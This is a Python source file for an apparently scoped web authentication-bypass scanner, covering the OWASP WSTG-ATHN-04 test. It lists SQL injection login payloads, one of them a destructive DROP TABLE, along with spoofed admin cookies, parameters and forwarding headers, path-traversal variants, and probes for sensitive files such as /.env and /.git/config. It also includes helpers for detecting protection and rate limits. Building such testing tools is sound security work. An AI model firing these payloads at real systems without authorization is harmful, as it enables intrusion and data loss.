"""Authentication bypass testing tool (WSTG-ATHN-04)."""

from __future__ import annotations

import asyncio
import base64
import json
import math
import random
import re
from datetime import datetime
from pathlib import Path
from urllib.parse import urljoin, urlparse

import httpx
from sqlalchemy import select

from lib_webbh import (
    Asset,
    JobState,
    Vulnerability,
    get_session,
    push_task,
    setup_logger,
)
from lib_webbh.scope import ScopeManager, ScopeResult

from workers.authentication.base_tool import AuthenticationTool
from workers.authentication.concurrency import WeightClass, get_semaphore

logger = setup_logger("auth-bypass-tester")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

_SQLI_PAYLOADS = [
    "' OR '1'='1'--",
    "admin'--",
    "' OR 1=1--",
    '" OR ""="',
    "' OR 'x'='x",
    "1' OR '1'='1",
    "') OR ('1'='1",
    "' OR 1=1#",
    "admin'#",
    "' OR 'unusual'='unusual'--",
    "1 OR 1=1",
    "' OR ''='",
    '" OR 1=1--',
    "'; DROP TABLE users;--",
    "1; SELECT * FROM users--",
]

_RATE_LIMIT_SIGNALS = ["too many", "rate limit", "blocked", "try again", "slow down"]

_AUTH_REQUIRED_SIGNALS = [
    "login required",
    "please log in",
    "sign in to continue",
    "access denied",
    "authentication required",
]

_PROTECTED_PATHS = [
    "/admin", "/admin/dashboard", "/admin/users", "/admin/settings",
    "/api/users", "/api/admin", "/api/config", "/api/settings",
    "/dashboard", "/profile", "/account", "/settings",
    "/console", "/manager", "/control-panel", "/portal",
    "/api/v1/users", "/api/v1/admin", "/api/v2/users",
    "/internal", "/debug",
    "/wp-admin", "/wp-json/wp/v2/users",
    "/phpmyadmin", "/pma",
    "/backup", "/backups",
    "/server-status", "/server-info",
    "/.env", "/config.json",
    "/.git/config", "/.htaccess",
    "/actuator/env",
    "/graphql",
]

_LOGIN_PATHS = [
    "/login", "/signin", "/auth", "/authenticate",
    "/wp-login.php", "/admin/login", "/user/login",
    "/account/login", "/session/new", "/users/sign_in",
    "/auth/login", "/portal/login", "/panel/login",
]

_BYPASS_PARAMS = [
    ("authenticated", "yes"),
    ("admin", "true"),
    ("debug", "1"),
    ("bypass", "true"),
    ("auth", "1"),
    ("isAdmin", "true"),
]

_BYPASS_HEADERS = [
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Host": "localhost"},
    {"X-Forwarded-Host": "localhost"},
]

_BYPASS_COOKIES = [
    ("admin", "true"),
    ("admin", "1"),
    ("is_admin", "true"),
    ("role", "admin"),
    ("role", "administrator"),
    ("authenticated", "true"),
    ("isAuthenticated", "true"),
    ("access", "granted"),
]

_TRAVERSAL_PATHS = [
    "/admin/../admin",
    "/login/../admin",
    "/..;/admin",
    "/admin/..;/",
    "/%2e%2e/admin",
    "/./admin/./",
    "/admin/.",
    "/admin//",
]

_HTTP_METHODS = ["PUT", "DELETE", "PATCH", "HEAD"]

_SESSION_COOKIE_RE = re.compile(
    r"(?:PHPSESSID|JSESSIONID|sessionid|session|SESSID|ASP\.NET_SessionId|connect\.sid|sid|token)",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# Tool class
# ---------------------------------------------------------------------------

class AuthBypassTester(AuthenticationTool):
    """Test for authentication bypass vulnerabilities (WSTG-ATHN-04)."""

    name = "auth_bypass_tester"
    weight_class = WeightClass.HEAVY

    def build_command(self, target, credentials=None) -> list[str]:
        return ["true"]

    def parse_output(self, stdout: str) -> list:
        return []

    # ------------------------------------------------------------------
    # Detection helpers
    # ------------------------------------------------------------------

    def _is_protected(self, response) -> bool:
        """Return True if response indicates authentication is required."""
        if response is None:
            return True
        if response.status_code in (401, 403):
            return True
        if response.status_code in (301, 302, 303, 307, 308):
            location = response.headers.get("location", "").lower()
            if any(x in location for x in ("login", "auth", "signin", "unauthorized")):
                return True
        text = response.text.lower() if response.text else ""
        return any(x in text for x in _AUTH_REQUIRED_SIGNALS)

    def _is_rate_limited(self, response) -> bool:
        """Return True if response signals rate-limiting or IP block."""
        if response is None:
            return False
        if response.status_code == 429:
            return True
        text = response.text.lower() if response.text else ""
        return any(x in text for x in _RATE_LIMIT_SIGNALS)
